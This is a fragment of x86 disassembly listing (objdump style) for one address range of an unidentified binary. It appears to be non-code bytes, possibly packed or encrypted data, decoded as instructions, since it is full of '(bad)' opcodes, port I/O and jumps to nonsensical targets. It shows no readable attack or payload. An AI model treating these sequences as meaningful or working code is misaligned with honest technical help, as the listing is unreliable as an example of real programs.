  41323c:	adc    DWORD PTR [ecx-0x7e469201],esp
  413242:	add    esi,DWORD PTR cs:[ecx+0x163b808c]
  413249:	cmp    DWORD PTR [edx-0x6dc0481b],esp
  41324f:	test   al,0xa2
  413251:	in     eax,dx
  413252:	adc    eax,0xc24a8e53
  413257:	sub    BYTE PTR [ebp+0x49],ah
  41325a:	jmp    0xba74a7c4
  41325f:	or     BYTE PTR [edx],al
  413261:	jae    0x413284
  413263:	sar    DWORD PTR [ebp-0x75],1
  413266:	sub    DWORD PTR [ecx+ebx*4-0x3de3746c],eax
  41326d:	and    BYTE PTR [ebx-0x37e45d6b],al
  413273:	out    dx,eax
  413274:	(bad)  
  413275:	sti    
  413276:	sub    bl,ah
  413278:	or     BYTE PTR [edi],ch
  41327a:	dec    ebx
  41327b:	dec    ecx
  41327c:	stc    
  41327d:	xchg   ecx,eax
  41327e:	sub    eax,0x2066e0c2
  413283:	retf   
  413284:	js     0x4132cd
  413286:	imul   DWORD PTR [ecx+0x3f20a302]
  41328c:	jp     0x4132a6
  41328e:	in     eax,dx
  41328f:	jns    0x41322f
  413291:	(bad)  
  413292:	pop    edx
  413293:	sub    al,BYTE PTR [edx-0x1902e12c]
  413299:	adc    al,bl
  41329b:	mov    ebp,0xffdbfa9b
  4132a0:	ror    DWORD PTR [ebp+0x4c],1
  4132a3:	int3   
  4132a4:	dec    ebp
  4132a5:	xchg   ebx,eax
  4132a6:	sub    eax,0xd55181f1
  4132ab:	xchg   ebx,eax
  4132ac:	scas   al,BYTE PTR es:[edi]
  4132ad:	add    al,0x32
  4132af:	add    DWORD PTR [edi-0x34],edi
  4132b2:	pop    es
  4132b3:	or     al,0x30
  4132b5:	inc    ebp
  4132b6:	add    ah,BYTE PTR [esi]
  4132b8:	nop
  4132b9:	xchg   ebx,eax
  4132ba:	mov    WORD PTR [edx],?
  4132bc:	ins    BYTE PTR es:[edi],dx
  4132bd:	clc    
  4132be:	scas   al,BYTE PTR es:[edi]
  4132bf:	sbb    DWORD PTR [ebx+0x7],esp
  4132c2:	cld    
  4132c3:	in     al,dx
  4132c4:	test   al,0x44
  4132c6:	xchg   esp,eax
  4132c7:	add    eax,0x8aadf6ca
  4132cc:	(bad)  
  4132ce:	sahf   
  4132cf:	push   ds
  4132d0:	sbb    al,BYTE PTR [ecx]
  4132d2:	pop    esi
  4132d3:	scas   al,BYTE PTR es:[edi]
  4132d4:	mov    cl,0x4e
  4132d6:	xor    edx,DWORD PTR [ebx]
  4132d8:	sahf   
  4132d9:	ret    0x1c82
  4132dc:	imul   ebp,DWORD PTR [ebx],0xe857f846
  4132e2:	add    al,0x99
  4132e4:	mov    al,ds:0xffae8749
  4132e9:	in     al,0x22
  4132eb:	or     DWORD PTR [edx-0x1c],edx
  4132ee:	mov    bh,0x7b
  4132f0:	in     eax,dx
  4132f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4132f2:	imul   ebx,DWORD PTR [esp+eax*1],0xffffff81
  4132f6:	repnz xchg ebp,eax
  4132f8:	fdivr  QWORD PTR [ecx-0x10]
  4132fb:	mov    WORD PTR [esi],cs
  4132fd:	ret    
  4132fe:	xor    DWORD PTR [edi],esi
  413300:	push   edi
  413301:	outs   dx,BYTE PTR ds:[esi]
  413302:	xchg   ebp,eax
  413303:	lds    ebx,FWORD PTR ds:0x154ea85f
  413309:	push   0x68
  41330b:	fistp  WORD PTR [esi-0x382e9b5]
  413311:	pop    dx
  413313:	xor    BYTE PTR [eax-0x1c],bl
  413316:	pop    ebp
  413317:	(bad)  
  413318:	jb     0x41336d
  41331a:	loopne 0x413329
  41331c:	xchg   edi,eax
  41331d:	sbb    eax,0x9e25d90d
  413322:	xchg   dh,bh
  413324:	pop    edi
  413325:	jo     0x413379
  413327:	fisub  WORD PTR [edi]
  413329:	mov    eax,0x7da89878
  41332e:	lea    eax,[edx]
  413330:	mov    edi,0xe6d0b987
  413335:	daa    
  413336:	mov    ebx,0x6f7e3392
  41333b:	cmp    DWORD PTR [edi+ebp*8+0x63f01c1e],esi
  413342:	jmp    0xf6b6:0xcc9348f3
  413349:	push   ss
  41334a:	(bad)  
  41334b:	fbstp  TBYTE PTR [eax+0x29]
  41334f:	out    0xd3,al
  413351:	or     BYTE PTR [ebx-0x33bce81f],0x9
  413358:	adc    eax,0x2ec0b66e
  41335d:	lahf   
  41335e:	cmp    edi,DWORD PTR [ebp+edx*1-0x21]
  413362:	pop    ebp
  413363:	ins    DWORD PTR es:[edi],dx
  413364:	imul   esi,DWORD PTR [edx+0x2d],0xe7c037d7
  41336b:	sbb    eax,0x44cb4bbb
  413370:	jmp    0x4ff799e2
  413375:	or     ecx,ebp
  413377:	mov    bl,0x35
  413379:	pop    ds
  41337a:	sub    ah,cl
  41337c:	pop    DWORD PTR [bx+di-0x51b3]
  413381:	xchg   ecx,eax
  413382:	ja     0x4133e8
  413384:	adc    eax,0x334edb3f
  413389:	dec    eax
  41338a:	sub    edi,DWORD PTR [ebp+0x39]
  41338d:	pop    esi
  41338e:	fninit 
  413390:	cmp    bh,ah
  413392:	jl     0x413369
  413394:	in     eax,dx
  413395:	pop    es
  413396:	fdiv   QWORD PTR [ecx+ebp*8-0x2768cd5c]
  41339d:	jae    0x413417
  41339f:	addr16 inc ebp
  4133a1:	stc    
  4133a2:	pop    edi
  4133a3:	push   0x72
  4133a5:	test   edx,edx
  4133a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4133a8:	or     eax,0x138e8e87
  4133ad:	lea    eax,[ebx-0x80]
  4133b0:	imul   esp,DWORD PTR [esi+0x60bc1182],0xf5ce7354
  4133ba:	push   ebx
  4133bb:	push   0xffffff85
  4133bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4133be:	int3   
  4133bf:	xor    ebp,0xa2058d02
  4133c5:	adc    eax,0xc3a40b61
  4133ca:	mov    ecx,DWORD PTR [esi+0x4b]
  4133cd:	cmp    eax,0x47852ae0
  4133d2:	cmc    
  4133d3:	cdq    
  4133d4:	or     BYTE PTR [ebp-0x755e3ee4],dl
  4133da:	sub    ecx,DWORD PTR [ebp-0xc1d21ef]
  4133e0:	pop    ss
  4133e1:	pop    esi
  4133e2:	cmp    esi,ebp
  4133e4:	int3   
  4133e5:	push   esi
  4133e6:	rcr    BYTE PTR [ecx],1
  4133e8:	push   esi
  4133e9:	xlat   BYTE PTR ds:[ebx]
  4133ea:	inc    ecx
  4133eb:	pop    edx
  4133ec:	leave  
  4133ed:	fldl2e 
  4133ef:	sti    
  4133f0:	or     dh,al
  4133f2:	dec    bl
  4133f4:	jnp    0x4133d0
  4133f6:	jmp    0x413476
  4133f8:	into   
  4133f9:	adc    al,0xea
  4133fb:	loop   0x4133f6
  4133fd:	dec    ebp
  4133fe:	int    0x54
  413400:	in     al,dx
  413401:	in     al,0xc7
  413403:	jno    0x41338e
  413405:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413406:	aas    
  413407:	scas   al,BYTE PTR es:[edi]
  413408:	or     ecx,DWORD PTR [esi+0x60578fe6]
  41340e:	daa    
  41340f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413410:	int3   
  413411:	ret    
  413412:	fimul  WORD PTR [eax]
  413414:	mov    ds:0x331bd739,eax
  413419:	neg    DWORD PTR [edi-0x51]
  41341c:	sub    esp,edi
  41341e:	mov    ds:0xf24947fa,al
  413423:	cmc    
  413424:	aad    0xa5
  413426:	retf   
  413427:	or     eax,0x7fc1f095
  41342c:	and    DWORD PTR [eax+0x7f],edx
  41342f:	inc    eax
  413430:	jno    0x413424
  413432:	cdq    
  413433:	sub    ebp,eax
  413435:	aam    0x1
  413437:	or     eax,0x1651e1c6
  41343c:	jne    0x4133cc
  41343e:	cmp    eax,0x18e10b81
  413443:	retf   
  413444:	lods   al,BYTE PTR ds:[esi]
  413445:	leave  
  413446:	hlt    
  413447:	addr16 dec ebp
  413449:	repnz lea esi,[esi-0x41e3b0c7]
  413450:	and    esi,DWORD PTR [ebx-0x51d07a98]
  413456:	inc    ebp
  413457:	or     ah,ch
  413459:	hlt    
  41345a:	dec    edi
  41345b:	mov    edx,0x2dc3bddb
  413460:	mov    ebx,0x49cf204
  413465:	imul   ebx,ecx,0x1
  413468:	aaa    
  413469:	aas    
  41346a:	sar    BYTE PTR [esp+ebp*4+0x5cd607b4],cl
  413471:	jns    0x413441
  413473:	dec    ebx
  413474:	mov    cl,0xd1
  413476:	or     al,0x68
  413478:	push   esi
  413479:	not    DWORD PTR [edi+edx*4]
  41347c:	pop    eax
  41347d:	or     edi,DWORD PTR [eax]
  41347f:	call   0x48b582b9
  413484:	jb     0x413474
  413486:	mov    cl,0xc8
  413488:	dec    esp
  413489:	sub    BYTE PTR [esi+0x63d9f3fa],bl
  41348f:	jecxz  0x4134bc
  413491:	push   es
  413492:	ret    
  413493:	call   0x97056043
  413498:	test   BYTE PTR [edi-0x43],0x87
  41349c:	sub    al,BYTE PTR [ecx]
  41349e:	call   0x717768e5
  4134a3:	mov    eax,ds:0xd232aaf9
  4134a8:	out    0xc9,eax
  4134aa:	mov    eax,0xe2302acc
  4134af:	outs   dx,BYTE PTR ds:[esi]
  4134b0:	mov    ch,BYTE PTR [ebp+0x3]
  4134b3:	ficomp DWORD PTR [edx+edx*8]
  4134b6:	inc    esi
  4134b7:	jmp    0xf34b:0x1831
  4134bd:	nop
  4134be:	shl    dh,1
  4134c0:	pop    eax
  4134c1:	or     al,0x82
  4134c3:	mov    eax,DWORD PTR [edi-0xf]
  4134c6:	pop    esi
  4134c7:	xchg   BYTE PTR [edi+edx*8],cl
  4134ca:	jmp    0x7a11:0xcc2eadb
  4134d1:	adc    DWORD PTR [ecx+ecx*8-0x272685c8],edx
  4134d8:	daa    
  4134d9:	mov    ecx,0x560d5d1e
  4134de:	push   edx
  4134df:	push   ds
  4134e0:	arpl   WORD PTR cs:[ebp+0x44],bx
  4134e4:	cs inc ebx
  4134e6:	mov    cl,bl
  4134e8:	adc    eax,0xb6e5cd24
  4134ed:	ret    
  4134ee:	pusha  
  4134ef:	xor    ebp,DWORD PTR [edi]
  4134f1:	scas   al,BYTE PTR es:[edi]
  4134f2:	mov    ecx,0x4dcf2047
  4134f7:	lods   al,BYTE PTR ds:[esi]
  4134f8:	in     eax,dx
  4134f9:	rcl    DWORD PTR [eax+0x56],0xb7
  4134fd:	cs cmp ebp,ecx
  413500:	mov    cl,0xb2
  413502:	pop    ebx
  413503:	div    DWORD PTR [esi+0x22]
  413506:	mov    dh,0x7
  413508:	inc    ebx
  413509:	jno    0x41351b
  41350b:	jle    0x4134b6
  41350d:	leave  
  41350e:	xchg   ebp,eax
  41350f:	cmp    eax,0xb3995148
  413514:	jecxz  0x41356e
  413516:	push   es
  413517:	xchg   ebp,eax
  413518:	add    DWORD PTR [esi+0x5c55afb0],ecx
  41351e:	xchg   ebx,eax
  41351f:	int    0x82
  413521:	jl     0x41351d
  413523:	mov    ecx,0xce21234
  413528:	and    edi,ecx
  41352a:	add    dh,BYTE PTR [edx]
  41352c:	pop    ebx
  41352d:	nop
  41352e:	(bad)  
  41352f:	sub    BYTE PTR [esi+edx*2],dh
  413532:	scas   eax,DWORD PTR es:[edi]
  413533:	sbb    edx,esi
  413535:	stos   DWORD PTR es:[edi],eax
  413536:	pop    ecx
  413537:	ja     0x41356a
  413539:	test   DWORD PTR [esi],esp
  41353b:	fcomp  QWORD PTR [ebp-0x47]
  41353e:	leave  
  41353f:	es sbb al,0xb7
  413542:	adc    esp,DWORD PTR [ebx]
  413544:	repnz add bh,BYTE PTR [edx+esi*1-0xc]
  413549:	push   es
  41354a:	xchg   edx,eax
  41354b:	shl    DWORD PTR [esi-0x55472839],0x8a
  413552:	cmp    ebp,DWORD PTR [ecx+0x1d46224b]
  413558:	jno    0x4135af
  41355a:	mov    eax,0x361e6b11
  41355f:	js     0x4134fa
  413561:	(bad)  
  413562:	xchg   esp,eax
  413563:	out    dx,eax
  413564:	cmp    DWORD PTR [esi-0x572f76e2],eax
  41356a:	into   
  41356b:	xor    ebx,ecx
  41356d:	clc    
  41356e:	dec    edi
  41356f:	pop    eax
  413570:	sti    
  413571:	add    ah,ch
  413573:	or     al,0x28
  413575:	push   esi
  413576:	cmpxchg BYTE PTR [edx-0x6da9d758],cl
  41357d:	imul   ecx,DWORD PTR [ebx],0x4e
  413580:	mov    ebp,0xea7e0842
  413585:	jle    0x413600
  413587:	inc    edx
  413588:	loopne 0x413555
  41358a:	cmp    BYTE PTR [ecx+0x5878db7d],0x10
  413591:	lods   al,BYTE PTR ds:[esi]
  413592:	inc    esp
  413593:	pop    cx
  413595:	mov    WORD PTR [eax],?
  413597:	pop    edx
  413598:	nop
  413599:	inc    eax
  41359a:	scas   eax,DWORD PTR es:[edi]
  41359b:	jo     0x413611
  41359d:	adc    cl,BYTE PTR [edx-0x2b]
  4135a0:	sar    ebx,cl
  4135a2:	ret    
  4135a3:	sbb    esi,edi
  4135a5:	ss dec ecx
  4135a7:	and    al,0x27
  4135a9:	cmp    dl,ah
  4135ab:	mov    ch,0x5b
  4135ad:	and    eax,0x7649b00f
  4135b2:	and    dh,ch
  4135b4:	dec    ebx
  4135b5:	sub    DWORD PTR [esi],esi
  4135b7:	mov    ch,0xff
  4135b9:	test   al,0xbe
  4135bb:	ss dec edx
  4135bd:	mov    bl,0x3b
  4135bf:	sub    esp,DWORD PTR [eax-0xf7a9a59]
  4135c5:	or     eax,0xbe3525a0
  4135ca:	(bad)
  4135cd:	fwait
  4135ce:	inc    ecx
  4135cf:	mov    esp,0x866b06f
  4135d4:	sub    ch,bh
  4135d6:	ret    
  4135d7:	jmp    0x1a5d:0x21435709
  4135de:	test   BYTE PTR [ecx-0x5a],bh
  4135e1:	repnz sbb BYTE PTR [eax+0x11172811],dh
  4135e8:	dec    ecx
  4135e9:	fstp   DWORD PTR [eax]
  4135eb:	mov    al,ah
  4135ed:	mov    eax,ds:0x1a75fb69
  4135f2:	fist   WORD PTR [esi]
  4135f4:	fidivr WORD PTR [esi]
  4135f6:	pop    edx
  4135f7:	clc    
  4135f8:	test   BYTE PTR [esp+esi*2+0xb1713c2],bl
  4135ff:	pushf  
  413600:	and    DWORD PTR [edx+0x32],edx
  413603:	xor    eax,esi
  413605:	repnz mov esp,0x3f2114e6
  41360b:	pop    eax
  41360c:	dec    edi
  41360d:	mov    ds,WORD PTR [eax-0x58]
  413610:	mov    cl,0x18
  413612:	psrld  mm2,QWORD PTR [edi]
  413615:	or     DWORD PTR ds:0x1ab48f10,esi
  41361b:	mov    gs,WORD PTR [ecx-0x5204c917]
  413621:	test   eax,0x5b60b04b
  413626:	mov    edx,0xf7914be
  41362b:	xchg   edx,eax
  41362c:	xchg   ch,bl
  41362e:	dec    edi
  41362f:	(bad)  
  413630:	jp     0x4135d1
  413632:	dec    ebp
  413633:	sbb    ebp,DWORD PTR [ecx+0x4eafe22d]
  413639:	(bad)  
  41363a:	pop    ds
  41363b:	pop    esp
  41363c:	jmp    0x4135ed
  41363e:	cmp    DWORD PTR [ebp-0x19ea9264],0xffffffd4
  413645:	and    ecx,DWORD PTR [edx]
  413647:	jae    0x41361a
  413649:	push   ebx
  41364a:	lock int 0x4a
  41364d:	in     al,0x75
  41364f:	stc    
  413650:	inc    ebp
  413651:	mov    bl,0x3c
  413653:	(bad)
  413658:	in     al,0xe2
  41365a:	inc    ebp
  41365b:	stc    
  41365c:	sub    DWORD PTR [ecx+0x31f71e7],esp
  413662:	push   0xffffffb4
  413664:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413665:	sub    eax,esi
  413667:	cld    
  413668:	jae    0x41366e
  41366a:	aad    0x2d
  41366c:	ja     0x41365a
  41366e:	stos   DWORD PTR es:[edi],eax
  41366f:	sahf   
  413670:	ins    DWORD PTR es:[edi],dx
  413671:	mov    esi,0xf7daf7dd
  413676:	mov    bh,0x71
  413678:	pop    ds
  413679:	jo     0x4136ce
  41367b:	add    BYTE PTR [ecx-0x36],0x65
  41367f:	outs   dx,DWORD PTR ds:[esi]
  413680:	sbb    eax,DWORD PTR [ecx]
  413682:	jmp    0x413692
  413684:	std    
  413685:	mov    esi,0x276f5b40
  41368a:	mov    esi,DWORD PTR [ecx-0x361fec49]
  413690:	ja     0x413702
  413692:	push   eax
  413693:	stos   DWORD PTR es:[edi],eax
  413694:	cmp    eax,0xdaa41633
  413699:	das    
  41369a:	mov    BYTE PTR cs:[ebp-0x6],0x4c
  41369f:	xlat   BYTE PTR ds:[ebx]
  4136a0:	jo     0x413637
  4136a2:	(bad)  
  4136a3:	ds cmc 
  4136a5:	inc    ebp
  4136a6:	and    esi,DWORD PTR [ebp+0x68]
  4136a9:	pop    esp
  4136aa:	cdq    
  4136ab:	xor    BYTE PTR [edi],bh
  4136ad:	sub    BYTE PTR [ecx+0x4cb97df1],dl
  4136b3:	xlat   BYTE PTR ds:[ebx]
  4136b4:	loope  0x413717
  4136b6:	fimul  DWORD PTR [edx+ebx*1+0x68]
  4136ba:	jecxz  0x4136b8
  4136bc:	sar    BYTE PTR [ecx-0x19],cl
  4136bf:	out    0xbd,eax
  4136c1:	or     eax,ecx
  4136c3:	ret    
  4136c4:	(bad)  [ebx]
  4136c6:	add    DWORD PTR [edx+0x46],edi
  4136c9:	jmp    0x4136ff
  4136cb:	in     eax,dx
  4136cc:	std    
  4136cd:	gs sub eax,0xdbb4ebf0
  4136d3:	daa    
  4136d4:	cmp    BYTE PTR [esi+0x40],ch
  4136d7:	mov    cl,0x37
  4136d9:	clc    
  4136da:	and    eax,0x1324e6f
  4136df:	inc    esp
  4136e0:	mov    bh,0x1d
  4136e2:	xor    eax,edi
  4136e4:	stos   DWORD PTR es:[edi],eax
  4136e5:	jmp    0xcae606a5
  4136ea:	and    eax,0x3f097e1c
  4136ef:	shr    BYTE PTR ds:0xb47dd66c,1
  4136f5:	jo     0x4136e5
  4136f7:	cmc    
  4136f8:	(bad)  
  4136f9:	jne    0x4136c3
  4136fb:	out    0x6e,al
  4136fd:	stc    
  4136fe:	jle    0x41374b
  413700:	jmp    0x9d5a6c2b
  413705:	xor    DWORD PTR [esi-0x74],0xffffffcc
  413709:	push   eax
  41370a:	xchg   al,cl
  41370c:	cmp    dl,BYTE PTR [ebp+0x55fe44ec]
  413712:	dec    ecx
  413713:	mov    edx,0x5c4f5454
  413718:	sub    esp,DWORD PTR [ecx+0x53]
  41371b:	mov    al,0xfd
  41371d:	pusha  
  41371e:	jmp    0x41375f
  413720:	and    ah,BYTE PTR [ebp+0x2a0fef4b]
  413726:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413727:	pop    ebp
  413728:	shl    ah,1
  41372a:	sar    BYTE PTR [ebp-0x283e60d6],0xf3
  413731:	and    esp,edx
  413733:	dec    esi
  413734:	scas   al,BYTE PTR es:[edi]
  413735:	jmp    0x4136f0
  413737:	enter  0x778a,0x13
  41373b:	xor    al,0xac
  41373d:	cwde   
  41373e:	pop    edx
  41373f:	stos   DWORD PTR es:[edi],eax
  413740:	xchg   esp,eax
  413741:	jns    0x4136e7
  413743:	(bad)  
  413745:	mov    ecx,DWORD PTR [eax]
  413747:	into   
  413748:	pusha  
  413749:	mov    cl,0x8d
  41374b:	jno    0x413786
  41374d:	or     dh,bh
  41374f:	ss aam 0xff
  413752:	xchg   al,bh
  413754:	pushf  
  413755:	push   ecx
  413756:	mov    BYTE PTR [eax],bh
  413758:	inc    ecx
  413759:	mov    fs,esi
  41375b:	pop    edi
  41375c:	mov    edx,0xd22f6a4f
  413761:	lods   eax,DWORD PTR ds:[esi]
  413762:	shl    DWORD PTR [edi],cl
  413764:	pop    ebp
  413765:	mov    edx,0xc9858701
  41376a:	daa    
  41376b:	mov    esi,0xc81a0bc0
  413770:	cli    
  413771:	mov    edi,0x1fa9f6da
  413776:	mov    ch,dh
  413778:	shl    DWORD PTR [edx-0x1c38e9b7],cl
  41377e:	fstp   QWORD PTR [edx-0x6]
  413781:	stos   DWORD PTR es:[edi],eax
  413782:	xchg   esp,eax
  413783:	std    
  413784:	dec    ecx
  413785:	je     0x41375e
  413787:	fucom  st(0)
  413789:	data16 neg bh
  41378c:	xchg   ebx,eax
  41378d:	sub    eax,0x5e3a1811
  413792:	pop    eax
  413793:	cld    
  413794:	shr    BYTE PTR [esi],0x88
  413797:	aas    
  413798:	sub    eax,DWORD PTR [eax+0xc]
  41379b:	int    0xf2
  41379d:	aas    
  41379e:	retf   
  41379f:	std    
  4137a0:	(bad)  
  4137a1:	(bad)  
  4137a2:	ja     0x413789
  4137a4:	adc    DWORD PTR [ebx],edi
  4137a6:	jmp    0x6c40:0xe063d309
  4137ad:	popf   
  4137ae:	mov    eax,0xcdb4533
  4137b3:	inc    esi
  4137b4:	mov    BYTE PTR [edx-0x10],bl
  4137b7:	or     DWORD PTR [ecx+0x7b],edi
  4137ba:	loope  0x413818
  4137bc:	lods   al,BYTE PTR ds:[esi]
  4137bd:	inc    ebx
  4137be:	aaa    
  4137bf:	mov    bl,BYTE PTR [esi+edi*2-0x5d]
  4137c3:	out    0x99,al
  4137c5:	lock sub DWORD PTR [esp+ebx*8+0x22],ebp
  4137ca:	aad    0x2d
  4137cc:	aad    0x6b
  4137ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4137cf:	adc    al,0x57
  4137d1:	xchg   edi,eax
  4137d2:	ror    BYTE PTR [esp+esi*1+0x530571d3],cl
  4137d9:	cmc    
  4137da:	repnz pop edx
  4137dc:	test   al,0xbd
  4137de:	dec    esp
  4137df:	in     eax,0xd3
  4137e1:	test   al,0x1a
  4137e3:	jmp    0x413793
  4137e5:	push   esi
  4137e6:	out    dx,eax
  4137e7:	push   cs
  4137e8:	xchg   esp,eax
  4137e9:	mov    esi,0xf99305f
  4137ee:	mov    WORD PTR [edx+0x3ba9c491],?
  4137f4:	(bad)  
  4137f5:	mov    al,ds:0x58bfb814
  4137fa:	dec    sp
  4137fc:	dec    ebp
  4137fd:	in     al,0x46
  4137ff:	adc    bl,ah
  413801:	xor    al,0x90
  413803:	popa   
  413804:	xor    al,0x29
  413806:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413807:	test   BYTE PTR [esi+0xfc89ce7],ah
  41380d:	or     ch,BYTE PTR [ecx]
  41380f:	and    ebx,DWORD PTR [edx]
  413811:	pop    es
  413812:	and    al,0xed
  413814:	mov    eax,ds:0x26858ec2
  413819:	rcr    BYTE PTR [ecx-0x33],cl
  41381c:	cmp    al,0xfe
  41381e:	aaa    
  41381f:	cmp    DWORD PTR [ecx-0x67ab9a78],ebp
  413825:	retf   
  413826:	pop    ss
  413827:	cdq    
  413828:	mov    al,ds:0x2a8c6b3b
  41382d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41382e:	imul   ebp,DWORD PTR [ebp+0x16adada5],0xffffff82
  413835:	jns    0x413890
  413837:	add    bl,cl
  413839:	sub    DWORD PTR [ebp+0x90e5e86],esp
  41383f:	test   BYTE PTR [eax],0xa8
  413842:	or     BYTE PTR [ebp-0x13],cl
  413845:	push   ecx
  413846:	sbb    al,dh
  413848:	or     ecx,DWORD PTR [esi+0x542df96]
  41384e:	int    0x1e
  413850:	sbb    BYTE PTR ss:[edx+0x65e8df2e],0xcd
  413858:	adc    al,0x14
  41385a:	out    dx,al
  41385b:	jmp    0xd6281ab0
  413860:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413861:	int    0x3a
  413863:	popa   
  413864:	mov    ecx,0x9b97b04b
  413869:	test   DWORD PTR [ebx+0x53493ef4],edx
  41386f:	rcl    DWORD PTR [ecx],cl
  413871:	push   esi
  413872:	sti    
  413873:	mov    al,bh
  413875:	(bad)  
  413876:	cmp    eax,ebx
  413878:	stos   BYTE PTR es:[edi],al
  413879:	pop    ebp
  41387a:	push   edx
  41387b:	in     al,dx
  41387c:	or     DWORD PTR [edi+eax*2-0x1e878a5b],0xffffffc3
  413884:	out    dx,al
  413885:	shl    BYTE PTR [ebx],1
  413887:	mov    ebx,0x1aa71667
  41388c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41388d:	arpl   bp,bx
  41388f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413890:	cmp    BYTE PTR [edx+0x585a2e8a],dh
  413896:	adc    cl,BYTE PTR [eax-0x45d78edd]
  41389c:	xlat   BYTE PTR ds:[ebx]
  41389d:	dec    esi
  41389e:	pop    edi
  41389f:	xchg   esi,eax
  4138a0:	xchg   esi,eax
  4138a1:	xor    bh,BYTE PTR [ecx]
  4138a3:	add    dl,bl
  4138a5:	out    dx,al
  4138a6:	mov    dh,0x9f
  4138a8:	aad    0xd3
  4138aa:	inc    ebx
  4138ab:	xchg   ecx,eax
  4138ac:	fwait
  4138ad:	shr    DWORD PTR ss:[esi-0x365d15d6],1
  4138b4:	mov    al,ds:0x7a7d205b
  4138b9:	inc    ecx
  4138ba:	jae    0x413849
  4138bc:	mov    esi,0x33a3fbb0
  4138c1:	dec    eax
  4138c2:	icebp  
  4138c3:	inc    ebx
  4138c4:	pushf  
  4138c5:	add    BYTE PTR [ebp+0x70376f01],bl
  4138cb:	jmp    0x413929
  4138cd:	vdivpd ymm3,ymm4,YMMWORD PTR [edx]
  4138d1:	or     al,0xbc
  4138d3:	adc    ecx,DWORD PTR [edi]
  4138d5:	lods   al,BYTE PTR ds:[esi]
  4138d6:	xor    al,0x41
  4138d8:	mov    bl,0xfd
  4138da:	dec    esi
  4138db:	repnz mov ecx,DWORD PTR [edi]
  4138de:	jmp    0x41392a
  4138e0:	sub    BYTE PTR [ecx-0x5c06c9c7],cl
  4138e6:	add    dh,BYTE PTR [ecx-0x46da3e47]
  4138ec:	pop    es
  4138ed:	adc    BYTE PTR [ebp+0x57],ah
  4138f0:	xchg   esi,eax
  4138f1:	jbe    0x4138a4
  4138f3:	xchg   eax,esp
  4138f5:	jae    0x4138a6
  4138f7:	ds out 0x51,eax
  4138fa:	mov    cl,0xdc
  4138fc:	inc    edx
  4138fd:	outs   dx,DWORD PTR ds:[esi]
  4138fe:	xchg   ebx,eax
  4138ff:	test   al,0xe9
  413901:	and    al,BYTE PTR [ecx+0x790f8ce1]
  413907:	adc    al,0x9d
  413909:	push   0xffffff99
  41390b:	jb     0x41389f
  41390d:	out    0x3b,eax
  41390f:	arpl   WORD PTR [esi-0x64e4f84b],sp
  413915:	inc    edx
  413916:	push   eax
  413917:	push   edi
  413918:	pop    ebp
  413919:	cwde   
  41391a:	sar    BYTE PTR [ebx],cl
  41391c:	outs   dx,DWORD PTR ds:[esi]
  41391d:	mov    BYTE PTR [ebx],bh
  41391f:	xor    al,0x3
  413921:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413922:	shl    BYTE PTR [eax+ecx*8],0x2c
  413926:	add    eax,0x261ae013
  41392b:	shl    BYTE PTR [esp+ecx*1+0x2a],0xdd
  413930:	ret    0x28cf
  413933:	jb     0x4139ac
  413935:	adc    DWORD PTR [ecx-0x5cf45579],edx
  41393b:	mov    edi,0xc32e8ab4
  413940:	fnstcw WORD PTR [esp+ecx*2+0x10]
  413944:	xor    eax,DWORD PTR [ebx-0x11bdd41]
  41394a:	adc    edx,DWORD PTR [esi]
  41394c:	js     0x413968
  41394e:	xchg   BYTE PTR [eax],bl
  413950:	xchg   edx,eax
  413951:	mov    dl,BYTE PTR [eax]
  413953:	fstp   QWORD PTR [esi]
  413955:	xlat   BYTE PTR ds:[ebx]
  413956:	loop   0x41390e
  413958:	mov    esi,0x19e5d66a
  41395d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41395e:	(bad)  [eax]
  413960:	sbb    DWORD PTR [ebx+ebx*8+0x79],0x2e
  413965:	sar    edx,cl
  413967:	inc    edx
  413968:	pop    esp
  413969:	cmp    dh,BYTE PTR [edx-0x1]
  41396c:	adc    eax,0x600b72a4
  413971:	xchg   esp,esi
  413973:	fnstcw WORD PTR fs:[esp+eax*8+0x2e]
  413978:	pop    ecx
  413979:	and    al,BYTE PTR [edi]
  41397b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41397c:	cmp    eax,0x6c87cd39
  413981:	mov    edx,DWORD PTR ds:[eax-0x6c]
  413985:	pusha  
  413986:	int3   
  413987:	mov    al,cl
  413989:	mov    eax,ecx
  41398b:	mov    edx,0x793a8f24
  413990:	dec    edi
  413991:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413992:	pop    esp
  413993:	int3   
  413994:	call   0x7d7c:0xc86b1ab6
  41399b:	add    eax,ebp
  41399d:	bound  edx,QWORD PTR [edx+0x25509cdb]
  4139a3:	pop    edi
  4139a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139a5:	push   esi
  4139a6:	cmc    
  4139a7:	call   0xc8c948b
  4139ac:	xchg   bh,cl
  4139ae:	push   edx
  4139af:	cmp    al,0x2a
  4139b1:	lahf   
  4139b2:	pushf  
  4139b3:	pop    ecx
  4139b4:	imul   esp,ebx,0xde9c2a35
  4139ba:	mov    eax,0x5298f89e
  4139bf:	add    BYTE PTR [esp+eax*1+0x28],ch
  4139c3:	mov    edx,DWORD PTR [esp+esi*1]
  4139c6:	ret    
  4139c7:	fcmovu st,st(4)
  4139c9:	and    DWORD PTR [edx+0x48],esp
  4139cc:	in     eax,dx
  4139cd:	or     eax,0x53d24002
  4139d2:	aad    0x23
  4139d4:	cs pushf 
  4139d6:	inc    ebx
  4139d7:	daa    
  4139d8:	or     BYTE PTR fs:[edx-0x123b4525],ch
  4139df:	mov    eax,0x20f5a66f
  4139e4:	in     eax,dx
  4139e5:	mov    edi,0xeafc7126
  4139ea:	sub    esp,edi
